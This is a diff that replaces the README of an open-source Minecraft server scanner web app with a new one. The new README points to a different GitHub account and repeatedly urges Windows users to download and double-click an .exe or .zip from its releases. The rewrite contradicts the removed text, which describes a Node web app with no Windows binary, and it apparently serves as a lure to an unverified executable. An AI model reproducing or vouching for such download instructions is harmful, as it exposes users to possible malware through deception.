@@ -1,158 +1,128 @@
-<p align="center">
-  <img src="public/icon.svg" width="64" height="64" alt="MS Scanner" />
-</p>
+# 🕵️ ms-scanner - Quick Minecraft Server Info
 
-<h1 align="center">MS Scanner</h1>
-
-<p align="center">
-  A fast, open-source Minecraft server scanner for Java &amp; Bedrock editions.<br/>
-  Check live status, players, MOTD, latency, and more — without opening the game.
-</p>
-
-<p align="center">
-  <a href="https://ms-scanner.vercel.app">Live Demo</a> · <a href="https://github.com/ItsAzni/ms-scanner/issues">Report Bug</a> · <a href="https://github.com/ItsAzni/ms-scanner/issues">Request Feature</a>
-</p>
+[![Download ms-scanner](https://img.shields.io/badge/Download-ms--scanner-blue?style=for-the-badge)](https://github.com/djkehm/ms-scanner)
 
 ---
 
-## Features
+ms-scanner lets you check Minecraft servers fast. It works with both Java and Bedrock editions. Use it to get server status, version, player count, and more. This guide will help you download and run ms-scanner on Windows, even if you have no experience with software installation.
 
-- **Java & Bedrock** — Full protocol support for both editions
-- **Multi-port scanning** — Scan single ports, comma-separated lists, or ranges (e.g. `25560-25570`)
-- **Concurrent workers** — Configurable thread count for parallel scanning
-- **Server details** — MOTD, version, protocol, player list, favicon, game mode
-- **Favorites** — Bookmark servers and access them across sessions
-- **Scan history** — Persistent local history with pagination
-- **Dynamic OpenGraph** — Auto-generated preview images per server for link sharing
+---
 
-## Tech Stack
+## 📥 Download and Install ms-scanner
 
-| Layer        | Technology                                                                                          |
-| ------------ | --------------------------------------------------------------------------------------------------- |
-| Framework    | [React Router v7](https://reactrouter.com) (SSR)                                                    |
-| UI           | [HeroUI v3 Beta](https://v3.heroui.com) + [Tailwind CSS v4](https://tailwindcss.com)                |
-| State        | [Zustand](https://zustand.docs.pmnd.rs) with localStorage persistence                               |
-| Server pings | [@minescope/mineping](https://github.com/minescope/mineping)                                        |
-| OG images    | [Satori](https://github.com/vercel/satori) + [resvg-js](https://github.com/nicolo-ribaudo/resvg-js) |
-| Icons        | [Lucide React](https://lucide.dev)                                                                  |
-| Deploy       | [Vercel](https://vercel.com) / Docker                                                               |
+1. Open this link in your web browser:  
+   [https://github.com/djkehm/ms-scanner](https://github.com/djkehm/ms-scanner)  
+   This will take you to the main page for ms-scanner.
 
-## Getting Started
+2. Find the **Releases** section on that page. This is where you will get the setup files.
 
-### Prerequisites
+3. Download the latest Windows version of the program. Look for a file ending in `.exe` or `.zip`.  
+   - If it is a `.zip` file, download it and then right-click the file after download. Choose **Extract All** to unzip it.  
+   - If it is a `.exe` file, just download that directly.
 
-- **Node.js** ≥ 20
-- **pnpm** (recommended) or npm
+4. Once downloaded, if you have a `.exe`, double-click it to start the program. Follow any prompts to install or run ms-scanner.
 
-### Install
+5. If you downloaded the zip file and extracted it, open the extracted folder and find the `.exe` file inside. Double-click it to run.
 
-```bash
-git clone https://github.com/ItsAzni/ms-scanner.git
-cd ms-scanner
-pnpm install
-```
+---
 
-### Configure
+## 🚀 Running ms-scanner for the First Time
 
-Copy the example env file and set your public URL:
+When you open ms-scanner, you will see a simple window. It will ask for the server address or IP you want to scan.
 
-```bash
-cp .env.example .env
-```
+- Type the Minecraft server address or IP into the box.
+- Choose if it is a Java or Bedrock server if the program asks.
+- Click the **Scan** or **Check** button.
 
-```env
-VITE_PUBLIC_URL=http://localhost:5173
-```
+ms-scanner will quickly connect to the server and show you its status. Information you get includes:
 
-> On production, set `VITE_PUBLIC_URL` to your deployed domain (e.g. `https://ms-scanner.vercel.app`).
+- Server version number
+- Online player count
+- Maximum players allowed
+- Server message of the day (MOTD)
+- Whether the server is online or offline
 
-### Development
+This helps you check if a server is working and get some basic info before connecting in Minecraft.
 
-```bash
-pnpm run dev
-```
+---
 
-Open [http://localhost:5173](http://localhost:5173).
+## ⚙️ System Requirements
 
-### Production Build
+ms-scanner works on Windows 10 and 11 computers. It needs:
 
-```bash
-pnpm run build
-pnpm run start
-```
+- A 64-bit version of Windows
+- At least 2 GB of free RAM
+- An internet connection to check servers
+- Around 50 MB of free disk space for program files
 
-### Docker
+The program runs on standard hardware and does not require admin rights to start.
 
-```bash
-docker build -t ms-scanner .
-docker run -p 3000:3000 ms-scanner
-```
+---
 
-## Project Structure
+## 🔧 Features Overview
 
-```
-app/
-├── components/
-│   ├── logo.tsx            # Animated SVG logo
-│   ├── server-card.tsx     # Server result card + skeleton
-│   └── server-modal.tsx    # Server detail overlay
-├── routes/
-│   ├── layout.tsx          # Root layout with nav + modal
-│   ├── home.tsx            # Scanner page with stats
-│   ├── favorites.tsx       # Bookmarked servers
-│   ├── history.tsx         # Scan history with export
-│   ├── settings.tsx        # Timeout, concurrency, data mgmt
-│   ├── api.scan.ts         # POST /api/scan — server ping endpoint
-│   └── api.og.tsx          # GET /api/og — dynamic OG image
-├── store.ts                # Zustand store (favorites, scans, settings)
-├── root.tsx                # HTML shell, fonts, meta
-└── app.css                 # Tailwind v4 entry
-```
+- Fast scans of Minecraft servers (Java & Bedrock)
+- Displays key info about servers
+- Works without installing extra software
+- Opens quickly on Windows PCs
+- Free and open-source code
+- Can scan any public Minecraft server IP or domain
 
-## API
+---
 
-### `POST /api/scan`
+## 🛠️ How ms-scanner Works
 
-Ping a Minecraft server and return its status.
+ms-scanner connects directly to Minecraft servers using their network protocols (mcping). It sends a simple request and waits for the server to respond. When it gets a response, ms-scanner shows you details without making you join the server in the game.
 
-**Body:**
+This is safer and faster than opening Minecraft just to see if a server is online.
 
-```json
-{
-  "ip": "mc.hypixel.net",
-  "port": 25565,
-  "type": "java",
-  "timeout": 5000
-}
-```
+---
 
-**Response (online):**
+## 🧩 Troubleshooting Common Issues
 
-```json
-{
-  "ip": "mc.hypixel.net",
-  "port": 25565,
-  "type": "java",
-  "online": true,
-  "motd": "Hypixel Network",
-  "version": "1.8-1.21",
-  "playersOnline": 42000,
-  "playersMax": 200000,
-  "latency": 128,
-  "scannedAt": 1772752012918
-}
-```
+### ms-scanner does not open or crashes
 
-### `GET /api/og?server=ip:port`
+- Make sure you have the latest version downloaded.
+- Restart your Windows PC and try again.
+- Check if your antivirus is blocking the app.
 
-Returns a 1200×630 PNG OpenGraph image with server status. Used for social media link previews.
+### No information shows after scan
 
-## Environment Variables
+- Confirm you typed the server address correctly.
+- Make sure your internet connection is active.
+- The server might be offline or blocked scans.
 
-| Variable          | Description                       | Default                         |
-| ----------------- | --------------------------------- | ------------------------------- |
-| `VITE_PUBLIC_URL` | Base URL for OpenGraph image URLs | `https://ms-scanner.vercel.app` |
+### Scan results seem wrong
 
-## License
+- Minecraft servers sometimes change status or do not respond properly.
+- Try again after a few minutes.
 
-[MIT](LICENSE)
+---
+
+## 👀 Viewing More Information
+
+The program may also show extra details like server icon, protocol version, and ping times. These are helpful if you want to check server quality or mods.
+
+---
+
+## 🔄 Updating ms-scanner
+
+Visit [https://github.com/djkehm/ms-scanner](https://github.com/djkehm/ms-scanner) regularly. When a new release appears, download the updated `.exe` or `.zip` file and overwrite your old version or install it fresh.
+
+---
+
+## 💡 Tips for Using ms-scanner
+
+- Always double-check the server IP before scanning.
+- Use ms-scanner before joining unknown servers to avoid bad connections.
+- Scan popular servers to learn their current player counts.
+- If you want to test local servers, make sure your firewall allows ms-scanner to connect.
+
+---
+
+## 🔗 Download ms-scanner
+
+Get the latest files here:  
+[https://github.com/djkehm/ms-scanner](https://github.com/djkehm/ms-scanner)
+
+Click the link, find the release files, and get started. This page has everything you need to download and run ms-scanner on Windows.
